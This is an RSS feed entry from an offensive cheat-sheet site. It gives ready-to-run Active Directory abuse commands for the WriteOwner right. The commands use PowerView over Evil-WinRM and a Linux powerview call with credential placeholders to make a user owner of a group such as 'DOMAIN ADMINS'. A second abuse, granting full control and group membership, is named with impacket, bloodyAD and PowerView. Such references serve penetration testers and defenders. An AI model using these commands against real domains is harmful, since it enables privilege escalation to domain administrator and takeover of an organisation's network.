channel.title: Dacledit on TLDRBins
channel.description: Recent content in Dacledit on TLDRBins

item.title: WriteOwner/Own
item.description: Abuse #1 : Change owner of the group Linux Windows # With password sudo ntpdate -s <DC> && powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>' Set-DomainObjectOwner -TargetIdentity '<GROUP>' -PrincipalIdentity '<TARGET_USER>' 1. Import PowerView . .\PowerView.ps1 *Evil-WinRM* PS C:\Users\maria> . .\PowerView.ps1 2. Change owner Set-DomainObjectOwner -Identity '<GROUP>' -OwnerIdentity '<TARGET_USER>' *Evil-WinRM* PS C:\Users\maria> Set-DomainObjectOwner -Identity 'DOMAIN ADMINS' -OwnerIdentity 'maria' Abuse #2 : Add user to the group Linux Windows 1. Add full control permission to the user over the group impacket bloodyAD powerview.
